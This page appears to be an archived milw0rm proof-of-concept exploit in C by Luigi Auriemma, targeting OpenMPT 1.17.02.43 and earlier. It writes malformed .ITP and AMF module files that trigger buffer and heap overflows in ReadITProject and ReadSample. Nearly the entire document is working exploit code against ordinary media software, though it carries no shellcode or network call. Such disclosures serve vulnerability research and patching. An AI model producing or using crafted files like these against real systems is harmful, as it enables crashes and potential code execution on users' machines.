<html><head><title>OpenMPT <= 1.17.02.43 Multiple Remote Buffer Overflow Exploit PoC</title></head><pre>/*

by Luigi Auriemma

*/

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;stdint.h&gt;

#ifdef WIN32
    #include &lt;winsock.h&gt;    // htonl
#else
    #include &lt;netinet/in.h&gt;
#endif



#define VER             &quot;0.1&quot;
#define HEAPOVERSZ      512
#define ITPHEAPOVERSZ   150000
#define ALLOCSAMPLESZ   ((39 &amp; ~7) + 16)
#define SONG_ITPROJECT  0x20000


void fwbof(FILE *fd, int len, int chr);
void fwi32(FILE *fd, int num);
void std_err(void);



#pragma pack(1)

typedef struct {
    uint8_t     sign[35];
    uint8_t     patterns;
    uint8_t     orders;
    uint8_t     dunno1;
    uint8_t     dunno2[256];
} amf_head_t;

typedef struct {
    uint8_t     name[22];
    uint8_t     finetune;
    uint8_t     volume;
    uint8_t     dunno1;
    uint32_t    length;
    uint32_t    reppos;
    uint32_t    replen;
} amf_smp_t;

#pragma pack()



int main(int argc, char *argv[]) {
    amf_head_t      amf_head;
    amf_smp_t       amf_smp;
    FILE    *fd;
    int     i,
            attack;
    char    *fname;

    setbuf(stdout, NULL);

    fputs(&quot;\n&quot;
        &quot;OpenMPT &lt;= 1.17.02.43 and SVN &lt;= 157 stack and heap overflows &quot;VER&quot;\n&quot;
        &quot;by Luigi Auriemma\n&quot;
        &quot;e-mail: aluigi@autistici.org\n&quot;
        &quot;web:    aluigi.org\n&quot;
        &quot;\n&quot;, stdout);

    if(argc &lt; 2) {
        printf(&quot;\n&quot;
            &quot;Usage: %s &lt;attack&gt; &lt;output_file&gt;\n&quot;
            &quot;\n&quot;
            &quot;Attacks:\n&quot;
            &quot; 1 = various global buffer overflows in ReadITProject (*.ITP)\n&quot;
            &quot; 2 = heap overflow in ReadSample                      (*.AMF)\n&quot;
            &quot;\n&quot;, argv[0]);
        exit(1);
    }

    attack = atoi(argv[1]);
    fname  = argv[2];

    printf(&quot;- create file %s\n&quot;, fname);
    fd = fopen(fname, &quot;wb&quot;);
    if(!fd) std_err();

    if(attack == 1) {
        fwi32(fd, 0x2e697470);          // .itp
        fwi32(fd, 0x00000000);          // version
        fwi32(fd, ITPHEAPOVERSZ);       // song name len
        fwbof(fd, ITPHEAPOVERSZ, 'a');  // song name
        fwi32(fd, 0);                   // comments len
        fwi32(fd, SONG_ITPROJECT);      // m_dwSongFlags
        fwi32(fd, 128);                 // m_nDefaultGlobalVolume
        fwi32(fd, 0);                   // m_nSongPreAmp
        fwi32(fd, 0);                   // m_nDefaultSpeed
        fwi32(fd, 0);                   // m_nDefaultTempo
        fwi32(fd, 0);                   // m_nChannels
        fwi32(fd, 0);                   // channel name len
        // for(i=0; i&lt;m_nChannels; i++){
        fwi32(fd, 0);                   // LoadMixPlugins len
        fwi32(fd, 0);                   // m_MidiCfg len
        fwi32(fd, 0);                   // m_nInstruments
        fwi32(fd, 0);                   // path instruments len
        fwi32(fd, 0);                   // order len
        fwi32(fd, 0);                   // number of patterns
        fwi32(fd, 0);                   // m_nPatternNames
        fwi32(fd, 0);                   // m_lpszPatternNames len
        fwi32(fd, 0);                   // modcommand data length
        fwi32(fd, 0);                   // m_nSamples
        fwi32(fd, 0);                   // Read number of embeded samples

    } else if(attack == 2) {
        memset(&amp;amf_head, 0, sizeof(amf_head));
        memset(&amp;amf_smp,  0, sizeof(amf_smp));

        strcpy(amf_head.sign, &quot;ASYLUM Music Format V1.0&quot;);
        amf_head.patterns = 1;
        amf_head.orders   = 1;
        fwrite(&amp;amf_head, sizeof(amf_head), 1, fd);

        for(i = 0; i &lt; 64; i++) {
            sprintf(amf_smp.name, &quot;sample %d&quot;, i);
            amf_smp.finetune = 0;
            amf_smp.volume   = 64;
            amf_smp.length   = ((0 - 6) - 39) + 16; // ReadSample and AllocateSample
            amf_smp.reppos   = 0;
            amf_smp.replen   = 0;
            fwrite(&amp;amf_smp, sizeof(amf_smp), 1, fd);
        }

        fwbof(fd, 64 * 32, 0x00);

        fwbof(fd, ALLOCSAMPLESZ + HEAPOVERSZ, 'a');
    }

    fclose(fd);
    printf(&quot;- finished\n&quot;);
    return(0);
}



void fwbof(FILE *fd, int len, int chr) {
    while(len--) fputc(chr, fd);
}



void fwi32(FILE *fd, int num) {
    fputc((num      ) &amp; 0xff, fd);
    fputc((num &gt;&gt;  8) &amp; 0xff, fd);
    fputc((num &gt;&gt; 16) &amp; 0xff, fd);
    fputc((num &gt;&gt; 24) &amp; 0xff, fd);
}



void std_err(void) {
    perror(&quot;\nError&quot;);
    exit(1);
}

// milw0rm.com [2006-08-10]</pre></html>